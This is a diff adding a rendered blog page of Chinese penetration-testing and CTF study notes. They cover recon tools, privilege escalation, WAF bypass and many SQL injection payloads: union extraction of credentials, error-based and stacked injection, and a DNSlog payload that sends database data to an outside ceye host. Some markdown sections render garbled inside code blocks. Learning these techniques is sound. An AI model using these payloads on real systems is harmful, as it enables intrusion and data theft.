@@ -1,0 +1,1558 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/fluid.png">
+  <link rel="icon" href="/img/fluid.png">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="Greed">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="知识补充允许测试的网页 http:&#x2F;&#x2F;testfire.net&#x2F; vulnweb.com  工具收集信息 水泽(kali::  python3.7 shuize.py -d domain)  app-&gt;web 反编译(漏了个大洞) 抓包(burp)  CDN检查&#x2F;绕过 超级ping 站长之家 爱站网 http:&#x2F;&#x2F;tool.chinaz.com&#x2F;nslookup&#x2F; https:&#x2F;&#x2F;">
+<meta property="og:type" content="article">
+<meta property="og:title" content="网安学习笔记(持续更新中)">
+<meta property="og:url" content="https://just1greed.github.io/2023/11/26/%E7%BD%91%E5%AE%89%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0%E4%B8%AD/index.html">
+<meta property="og:site_name" content="Welcome to greed&#39; blog">
+<meta property="og:description" content="知识补充允许测试的网页 http:&#x2F;&#x2F;testfire.net&#x2F; vulnweb.com  工具收集信息 水泽(kali::  python3.7 shuize.py -d domain)  app-&gt;web 反编译(漏了个大洞) 抓包(burp)  CDN检查&#x2F;绕过 超级ping 站长之家 爱站网 http:&#x2F;&#x2F;tool.chinaz.com&#x2F;nslookup&#x2F; https:&#x2F;&#x2F;">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://just1greed.github.io/%E7%BD%91%E5%AE%89%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0%E4%B8%AD/image-20230515091345012.png">
+<meta property="article:published_time" content="2023-11-26T04:18:06.000Z">
+<meta property="article:modified_time" content="2023-11-26T04:19:12.507Z">
+<meta property="article:author" content="Greed">
+<meta property="article:tag" content="学习">
+<meta property="article:tag" content="笔记">
+<meta property="article:tag" content="渗透测试">
+<meta property="article:tag" content="知识点">
+<meta property="article:tag" content="小迪公开课">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://just1greed.github.io/%E7%BD%91%E5%AE%89%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0%E4%B8%AD/image-20230515091345012.png">
+  
+  
+    <meta name="referrer" content="no-referrer-when-downgrade">
+  
+  
+  <title>网安学习笔记(持续更新中) - Welcome to greed&#39; blog</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"just1greed.github.io","root":"/","version":"1.9.5-a","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false}},"search_path":"/local-search.xml","include_content_in_search":true};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+
+  
+<meta name="generator" content="Hexo 7.0.0"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>greed&#39; blog</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/">
+                <i class="iconfont icon-home-fill"></i>
+                <span>首页</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>归档</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/">
+                <i class="iconfont icon-category-fill"></i>
+                <span>分类</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/">
+                <i class="iconfont icon-tags-fill"></i>
+                <span>标签</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/">
+                <i class="iconfont icon-user-fill"></i>
+                <span>关于</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/links/">
+                <i class="iconfont icon-link-fill"></i>
+                <span>友链</span>
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/default.png') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="网安学习笔记(持续更新中)"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2023-11-26 12:18" pubdate>
+          2023年11月26日 中午
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          12k 字
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          100 分钟
+        
+      </span>
+    
+
+    
+    
+      
+        <span id="busuanzi_container_page_pv" style="display: none">
+          <i class="iconfont icon-eye" aria-hidden="true"></i>
+          <span id="busuanzi_value_page_pv"></span> 次
+        </span>
+        
+      
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <h1 id="seo-header">网安学习笔记(持续更新中)</h1>
+            
+              <p class="note note-info">
+                
+                  
+                    本文最后更新于：9 分钟前
+                  
+                
+              </p>
+            
+            
+              <div class="markdown-body">
+                
+                <h2 id="知识补充"><a href="#知识补充" class="headerlink" title="知识补充"></a>知识补充</h2><h3 id="允许测试的网页"><a href="#允许测试的网页" class="headerlink" title="允许测试的网页"></a>允许测试的网页</h3><ul>
+<li><a target="_blank" rel="noopener" href="http://testfire.net/">http://testfire.net/</a></li>
+<li>vulnweb.com</li>
+</ul>
+<h3 id="工具收集信息"><a href="#工具收集信息" class="headerlink" title="工具收集信息"></a>工具收集信息</h3><ul>
+<li>水泽(<strong>kali</strong>::  python3.7 shuize.py -d domain)</li>
+</ul>
+<h3 id="app-web"><a href="#app-web" class="headerlink" title="app-&gt;web"></a>app-&gt;web</h3><ul>
+<li>反编译(漏了个大洞)</li>
+<li>抓包(burp)</li>
+</ul>
+<h3 id="CDN检查-绕过"><a href="#CDN检查-绕过" class="headerlink" title="CDN检查&#x2F;绕过"></a>CDN检查&#x2F;绕过</h3><ul>
+<li>超级ping</li>
+<li><a target="_blank" rel="noopener" href="http://ping.chinaz.com/">站长之家</a></li>
+<li><a target="_blank" rel="noopener" href="http://ping.aizhan.com/">爱站网</a></li>
+<li><a target="_blank" rel="noopener" href="http://tool.chinaz.com/nslookup/">http://tool.chinaz.com/nslookup/</a></li>
+<li><a target="_blank" rel="noopener" href="https://www.17ce.com/">https://www.17ce.com/</a></li>
+<li>子域名查询</li>
+<li>邮件服务</li>
+<li>国外地址 如<a target="_blank" rel="noopener" href="https://tools.ipip.net/cdn.php">https://tools.ipip.net/cdn.php</a></li>
+<li>遗留文件查询 如PHPinfo</li>
+<li>fuckcdn w8fuckcdn zmap</li>
+</ul>
+<h3 id="waf检查"><a href="#waf检查" class="headerlink" title="waf检查"></a>waf检查</h3><ul>
+<li>wafwoof</li>
+<li><a target="_blank" rel="noopener" href="https://github.com/stamparm/identywaf">https://github.com/stamparm/identywaf</a></li>
+<li>rebots.txt</li>
+<li>网页源码检查</li>
+</ul>
+<h3 id="cms建站平台识别"><a href="#cms建站平台识别" class="headerlink" title="cms建站平台识别"></a>cms建站平台识别</h3><ul>
+<li><a target="_blank" rel="noopener" href="https://www.yunsee.cn/">https://www.yunsee.cn/</a></li>
+<li><a target="_blank" rel="noopener" href="http://whatweb.bugscaner.com/">http://whatweb.bugscaner.com/</a></li>
+</ul>
+<h3 id="ip发现"><a href="#ip发现" class="headerlink" title="ip发现"></a>ip发现</h3><ul>
+<li>kali 上的 netdiscover</li>
+</ul>
+<h3 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h3><ul>
+<li>Nmaps -sV</li>
+<li>黑暗引擎</li>
+</ul>
+<h3 id="网站-服务器信息搜索"><a href="#网站-服务器信息搜索" class="headerlink" title="网站&#x2F;服务器信息搜索"></a>网站&#x2F;服务器信息搜索</h3><ul>
+<li>bing&#x2F;google&#x2F;baidu</li>
+<li>shodan</li>
+<li>zoomeye</li>
+<li>fofa</li>
+</ul>
+<h3 id="子域名挖掘"><a href="#子域名挖掘" class="headerlink" title="子域名挖掘"></a>子域名挖掘</h3><ul>
+<li>teemo(python)</li>
+<li>layer(exe)</li>
+<li>证书查询(子域名公用)</li>
+<li><a target="_blank" rel="noopener" href="https://crt.sh/">crt.sh | Certificate Search</a></li>
+</ul>
+<h3 id="同ip、旁注、C段"><a href="#同ip、旁注、C段" class="headerlink" title="同ip、旁注、C段"></a>同ip、旁注、C段</h3><ul>
+<li><a target="_blank" rel="noopener" href="https://www.webscan.cc/">https://www.webscan.cc/</a></li>
+</ul>
+<h3 id="目录扫描"><a href="#目录扫描" class="headerlink" title="目录扫描"></a>目录扫描</h3><ul>
+<li>御剑</li>
+<li>dirsearch -u url(s)</li>
+<li>dirb(kali)</li>
+</ul>
+<h3 id="参数爆破"><a href="#参数爆破" class="headerlink" title="参数爆破"></a>参数爆破</h3><ul>
+<li><p>ffuf(kali)</p>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">ffuf -w <span class="hljs-regexp">/usr/</span>share<span class="hljs-regexp">/seclists/</span>Discovery<span class="hljs-regexp">/Web-Content/</span>burp-parameter-names.txt:PARAM -u http:<span class="hljs-regexp">//</span><span class="hljs-number">192.168</span>.<span class="hljs-number">48.141</span>/secret?PARAM=<span class="hljs-number">1</span><br></code></pre></td></tr></table></figure></li>
+</ul>
+<h3 id="PHP伪协议"><a href="#PHP伪协议" class="headerlink" title="PHP伪协议"></a>PHP伪协议<a id="PHP伪协议"></a></h3><p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/wjrblogs/p/12285202.html">CTF中常用的php伪协议利用 - 1ndex- - 博客园</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/endust/p/11804767.html">php伪协议 - 看不尽的尘埃 - 博客园</a></p>
+<h3 id="windows镜像站"><a href="#windows镜像站" class="headerlink" title="windows镜像站"></a>windows镜像站</h3><ul>
+<li><a target="_blank" rel="noopener" href="https://msdn.itellyou.cn/">https://msdn.itellyou.cn/</a></li>
+</ul>
+<h3 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h3><ul>
+<li><p><a target="_blank" rel="noopener" href="https://gtfobins.github.io/">linux各命令如何提权</a></p>
+</li>
+<li><p><a target="_blank" rel="noopener" href="https://github.com/carlospolop/PEASS-ng">自动提权检测项目</a></p>
+</li>
+<li><p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/xiaozi/p/12600258.html">提权辅助工具箱 - Bypass - 博客园</a></p>
+</li>
+<li><p><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_37407863/article/details/125574878#:~:text=%E8%BF%90%E7%BB%B4%E4%BA%BA%E5%91%98%E5%A6%82%E6%9E%9C%E5%9C%A8%E6%9C%8D,%E6%8F%90%E5%8D%87%E5%88%B0root%E3%80%82">SSH密钥提权_ssh提权</a></p>
+</li>
+<li><pre><code class="hljs">find / -perm -4000 -exec ls -al &#123;&#125; \; 2&gt;/dev/null
+<figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs vim"><br>  <br><br>### 反弹<span class="hljs-keyword">shell</span><br><br>- [反弹<span class="hljs-keyword">shell</span>原理和常见反弹<span class="hljs-keyword">shell</span>方式 - 知乎 (zhihu.<span class="hljs-keyword">com</span>)](https://zhuanlan.zhihu.<span class="hljs-keyword">com</span>/<span class="hljs-keyword">p</span>/<span class="hljs-number">446210083</span>)<br><br>- <span class="hljs-keyword">python</span>拿<span class="hljs-keyword">shell</span><br><br>  ```<span class="hljs-keyword">python</span><br>  <span class="hljs-keyword">python</span> -<span class="hljs-keyword">c</span> <span class="hljs-string">&quot;import pty;pty.spawn(&#x27;/bin/bash&#x27;)&quot;</span><br></code></pre></td></tr></table></figure>
+</code></pre>
+</li>
+</ul>
+<h3 id="做题遇到的小知识点"><a href="#做题遇到的小知识点" class="headerlink" title="做题遇到的小知识点"></a>做题遇到的小知识点</h3><ul>
+<li><p>jsfuck(直接丢控制台跑)<img src="/%E7%BD%91%E5%AE%89%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0%E4%B8%AD/image-20230515091345012.png" srcset="/img/loading.gif" lazyload alt="image-20230515091345012"></p>
+</li>
+<li><p>环境变量看一看 陌生链接点一点</p>
+<h5 id="http头"><a href="#http头" class="headerlink" title="http头"></a>http头</h5><ul>
+<li>代理 via</li>
+<li>伪造ip xff client-ip  X-REAL-IP</li>
+</ul>
+</li>
+<li><p><a target="_blank" rel="noopener" href="https://blog.csdn.net/dyw_666666/article/details/89973048">CTF必备密码编码大全</a></p>
+</li>
+<li><p>php文件上传漏洞遇到后缀限制 不仅可以通过.htaccess 也可以通过上传.user.ini文件声明一个文件包含[<a target="_blank" rel="noopener" href="https://blog.csdn.net/RABCDXB/article/details/113623796">SUCTF 2019]CheckIn_</a></p>
+</li>
+<li><p>md5解密: md5 somd5</p>
+</li>
+<li><p>遇到linux靶机直接搭载本地的情况，开机后按shift，选用户界面按e，修改ro为rw single init&#x3D;&#x2F;bin&#x2F;bash 按ctrl+x进入root用户命令行</p>
+</li>
+<li><p>brainfuck(一键解码能解)</p>
+</li>
+<li><p>linux系统开放139 445端口并伴有smb服务，可利用enum4linux扫描信息</p>
+</li>
+<li><p><a target="_blank" rel="noopener" href="https://boogipop.com/2023/03/02/FilterChain%E6%94%BB%E5%87%BB%E8%A7%A3%E6%9E%90%E5%8F%8A%E5%88%A9%E7%94%A8/">FilterChain攻击解析及利用</a></p>
+</li>
+<li><p><a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/241148#h3-7">Proc 目录在 CTF 中的利用</a></p>
+</li>
+<li><p>图片隐写工具(kali)Steghide  隐写密码爆破stegseek</p>
+</li>
+<li><p>反弹shell后远程下载(scp), 或者</p>
+<figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc">靶机<br>python3 -m http.server [port]<br><br>kali<br>wget <span class="hljs-link">http://</span>[<span class="hljs-string">靶机ip</span>]:[port]/文件名<br></code></pre></td></tr></table></figure>
+</li>
+<li><p>当返回值与页面内容不符时，可能是静态网页</p>
+</li>
+<li><p>拿到shell后先看history</p>
+</li>
+<li><p>扫目录时，如果目录不可直接查看，可以在字典后加一个.php或其他后缀再扫文件，比如</p>
+<figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs jboss-cli">dirb http:<span class="hljs-string">//192.168.48.141/secret</span> -X <span class="hljs-string">.php</span><br></code></pre></td></tr></table></figure>
+</li>
+<li><p>目录扫不出再去看js等有无泄露信息，不行就下载源码自己找敏感文件(数据库配置之类的)</p>
+</li>
+<li><p>全网历史版本查看 <a target="_blank" rel="noopener" href="http://archive.org/web/web.php">Wayback Machine</a></p>
+</li>
+<li><p>拿到ssh私钥但是登陆不上，可以用工具从私钥中爆破出密码</p>
+</li>
+<li><p>参数中包含<code>_</code>时可用非法字符<code>[</code>进行替换</p>
+</li>
+<li><p>php参数传递数组<code>?hint[]=your?&amp;hint[]=mine!&amp;hint[]=hint!!</code></p>
+</li>
+</ul>
+<h2 id="漏洞"><a href="#漏洞" class="headerlink" title="漏洞"></a>漏洞</h2><h3 id="sql注入"><a href="#sql注入" class="headerlink" title="sql注入"></a>sql注入</h3><h4 id="⭐mysql-（php注入）"><a href="#⭐mysql-（php注入）" class="headerlink" title="⭐mysql （php注入）"></a>⭐mysql （php注入）</h4><ul>
+<li><p>判断注入点</p>
+</li>
+<li><p>order by 猜测列名数量</p>
+</li>
+<li><h5 id="报错猜解准备"><a href="#报错猜解准备" class="headerlink" title="报错猜解准备"></a>报错猜解准备</h5><ul>
+<li>数据库版本：version()</li>
+<li>数据库名字：database()</li>
+<li>数据库用户：user()</li>
+<li>操作系统：@@version_compile_os</li>
+</ul>
+</li>
+<li><p>低版本 暴力破解</p>
+</li>
+<li><p>高版本 information_schema数据库里存放有所有数据库名、表名、列名。</p>
+</li>
+<li><p>表名  ?id&#x3D;-1 union select 1,group_concat(table_name),3,4 from information_schema.tables where table_schema&#x3D; <code>数据库名</code></p>
+</li>
+<li><p>列名   ?id&#x3D;-1 union select 1,group_concat(column_name),3,4 from information_schema.columns where table_name&#x3D;<code>表名</code></p>
+</li>
+<li><p>数据   ?id&#x3D;-1 union select 1,name,password,4 from <code>表名</code></p>
+</li>
+<li></li>
+<li><p>注入-&gt;文件写入 文件读取(数据库语法)</p>
+</li>
+<li><p>魔术引号-&gt;16进制编码 宽字节</p>
+</li>
+</ul>
+<h3 id="参数提交注入"><a href="#参数提交注入" class="headerlink" title="参数提交注入"></a>参数提交注入</h3><h4 id="参数类型"><a href="#参数类型" class="headerlink" title="参数类型"></a>参数类型</h4><ul>
+<li>数字 字符 搜索 json</li>
+</ul>
+<h4 id="请求方法"><a href="#请求方法" class="headerlink" title="请求方法"></a>请求方法</h4><ul>
+<li>get post cookie request http头</li>
+</ul>
+<h3 id="各种数据库注入及注入工具使用"><a href="#各种数据库注入及注入工具使用" class="headerlink" title="各种数据库注入及注入工具使用"></a>各种数据库注入及注入工具使用</h3><h4 id="access注入-asp注入"><a href="#access注入-asp注入" class="headerlink" title="access注入(asp注入)"></a>access注入(asp注入)</h4><ul>
+<li><p>不区分数据库 也无高级功能</p>
+</li>
+<li><p>库文件直接存放于网站目录下(可爆库)</p>
+</li>
+<li><p>联合查询 逐字猜解 使用工具(推荐)</p>
+</li>
+<li><p>union注入  http header注入  偏移注入等</p>
+</li>
+<li><h5 id="补充-表名列名猜解不到"><a href="#补充-表名列名猜解不到" class="headerlink" title="补充(表名列名猜解不到)"></a>补充(表名列名猜解不到)</h5><ul>
+<li>列名 偏移注入</li>
+<li>表名 源码命名方式猜解</li>
+</ul>
+</li>
+</ul>
+<h4 id="msSQL-sever注入"><a href="#msSQL-sever注入" class="headerlink" title="msSQL sever注入"></a>msSQL sever注入</h4><ul>
+<li>获取数据 文件读写 执行sql语句</li>
+<li>cmd命令 远程交互 注册表操作</li>
+<li><a target="_blank" rel="noopener" href="https://www.cnblogs.com/xishaonian/p/6173644.html">MSSQL注入 - 珍惜少年时 - 博客园 (cnblogs.com)</a></li>
+</ul>
+<h4 id="PostGresql注入"><a href="#PostGresql注入" class="headerlink" title="PostGresql注入"></a>PostGresql注入</h4><ul>
+<li><a target="_blank" rel="noopener" href="https://www.cnblogs.com/yilishazi/p/14710349.html">PostGresql 注入知识汇总 - 一粒砂子 - 博客园 (cnblogs.com)</a></li>
+</ul>
+<h4 id="Oracle注入"><a href="#Oracle注入" class="headerlink" title="Oracle注入"></a>Oracle注入</h4><ul>
+<li><a target="_blank" rel="noopener" href="https://www.cnblogs.com/peterpan0707007/p/8242119.html">【实战】Oracle注入总结 - Carrypan - 博客园 (cnblogs.com)</a></li>
+</ul>
+<h4 id="mongoDB注入"><a href="#mongoDB注入" class="headerlink" title="mongoDB注入"></a>mongoDB注入</h4><ul>
+<li><a target="_blank" rel="noopener" href="https://www.cnblogs.com/wefeng/p/11503102.html">Python操作MongoDB文档数据库 - wefeng - 博客园 (cnblogs.com)</a></li>
+<li>sqlmap无法识别 需要用nosqlattack</li>
+</ul>
+<h4 id="工具"><a href="#工具" class="headerlink" title="工具"></a>工具</h4><ul>
+<li>sqlmap -u url –v 3 [–data&#x3D;”id&#x3D;1”]  <a target="_blank" rel="noopener" href="https://blog.csdn.net/smli_ng/article/details/106026901">sqlmap详细使用教程_星落.的博客-CSDN博客_sqlmap</a></li>
+<li>nosqlattack  <a target="_blank" rel="noopener" href="https://github.com/youngyangyang04/NoSQLAttack">github-nosqlattack</a></li>
+</ul>
+<h3 id="查询方式-盲注"><a href="#查询方式-盲注" class="headerlink" title="查询方式 盲注"></a>查询方式 盲注</h3><h4 id="SQL查询语句"><a href="#SQL查询语句" class="headerlink" title="SQL查询语句"></a>SQL查询语句</h4><ul>
+<li><p>select * from news where id&#x3D;$id</p>
+</li>
+<li><p>insert into news (id, url,text) values ( 2，’x’,’$t’)</p>
+</li>
+<li><p>delete from news where id&#x3D;$id</p>
+</li>
+<li><p>update user set pwd&#x3D;’$p’ where id&#x3D;2 and username&#x3D;’ admin’</p>
+</li>
+<li><p>select * from news order by $id</p>
+</li>
+<li><p>select id , name , price from news order by $order</p>
+</li>
+</ul>
+<h4 id="盲注"><a href="#盲注" class="headerlink" title="盲注"></a>盲注</h4><p><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_42477007/article/details/96492174">https://blog.csdn.net/qq_42477007/article/details/96492174</a></p>
+<p>1、基于布尔的sQL盲注-逻辑判断 regexp, like , ascii,left, ord , mid<br>2、基于时间的sQL盲注-延时判断 if ,sleep<br>3、基于报错的sQL盲注-报错回显 floor, updatexml, extractvalue </p>
+<ul>
+<li><p>首先了解下updatexml()函数1</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs sql">`UPDATEXML (XML_document, XPath_string, new_value);`<br><br>第一个参数：XML_document是String格式，为XML文档对象的名称，文中为Doc<br><br>第二个参数：XPath_string (Xpath格式的字符串) ，如果不了解Xpath语法，可以在网上查找教程。<br><br>第三个参数：new_value，String格式，替换查找到的符合条件的数据<br><br>作用：改变文档中符合条件的节点的值<br><br>改变XML_document中符合XPATH_string的值<br><br>而我们的注入语句为：<br><br>`updatexml(<span class="hljs-number">1</span>,concat(<span class="hljs-number">0x7e</span>,(<span class="hljs-keyword">SELECT</span> @<span class="hljs-variable">@version</span>),<span class="hljs-number">0x7e</span>),<span class="hljs-number">1</span>)`<br><br>其中的concat()函数是将其连成一个字符串，因此不会符合XPATH_string的格式，从而出现格式错误，爆出 `@<span class="hljs-variable">@version</span>`<br></code></pre></td></tr></table></figure></li>
+</ul>
+<h3 id="特殊注入"><a href="#特殊注入" class="headerlink" title="特殊注入"></a>特殊注入</h3><h4 id="加解密注入"><a href="#加解密注入" class="headerlink" title="加解密注入"></a>加解密注入</h4><ul>
+<li>参数base64编码后传入 (可能伴有url编码 如’’%3D’→’&#x3D;’)</li>
+<li>将注入语句编码后传入参数</li>
+</ul>
+<h4 id="二次注入"><a href="#二次注入" class="headerlink" title="二次注入"></a>二次注入</h4><p>注入的语句中 特殊符号被魔术引号转义后储存在数据库  当其他地方通过查询得到该数据并用于数据库操作时 触发注入</p>
+<ul>
+<li>白盒审计</li>
+<li>常见于注册</li>
+<li>较难发现 不实用</li>
+</ul>
+<h4 id="DNSlog注入"><a href="#DNSlog注入" class="headerlink" title="DNSlog注入"></a>DNSlog注入</h4><ul>
+<li>ceye.io</li>
+<li>id&#x3D;1’ and if((select load_file(concat(‘\\‘, (select version()), ‘.[自己的标号].ceye.co\abc’))),1,0)–+</li>
+<li><a target="_blank" rel="noopener" href="https://github.com/ADOOO/DnslogSqlinj">ADOOO&#x2F;DnslogSqlinj (github.com)</a></li>
+</ul>
+<h4 id="中转注入"><a href="#中转注入" class="headerlink" title="中转注入"></a>中转注入</h4><ul>
+<li>写一个中转网页实现参数接收 加密 拼接并发送请求 且监听返回值 用注入工具对此网页进行测试</li>
+</ul>
+<h4 id="堆叠注入"><a href="#堆叠注入" class="headerlink" title="堆叠注入"></a>堆叠注入</h4><ul>
+<li>id&#x3D;1 ‘;insert into users(id,username,password) values ( 39, ‘less38 ‘, ‘hello ‘)–+</li>
+</ul>
+<h3 id="waf绕过"><a href="#waf绕过" class="headerlink" title="waf绕过"></a>waf绕过</h3><h4 id="干扰匹配规则"><a href="#干扰匹配规则" class="headerlink" title="干扰匹配规则"></a>干扰匹配规则<a id="disturb"></a></h4><ul>
+<li><pre><code class="mysql">%20union%20all%23%0a%20select%201,2,3%23
+ union all #
+  select 1,2,3#
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs bash"><br>  <br><br><span class="hljs-comment">#### http参数污染</span><br><br>- 不同的后端代码针对多个参数有不同的取用规则<br><br>- ```mysql<br>  ?<span class="hljs-built_in">id</span>=1/**&amp;<span class="hljs-built_in">id</span>=-1 union <span class="hljs-keyword">select</span> 1,2,3<span class="hljs-comment">#*/</span><br></code></pre></td></tr></table></figure>
+</code></pre>
+</li>
+</ul>
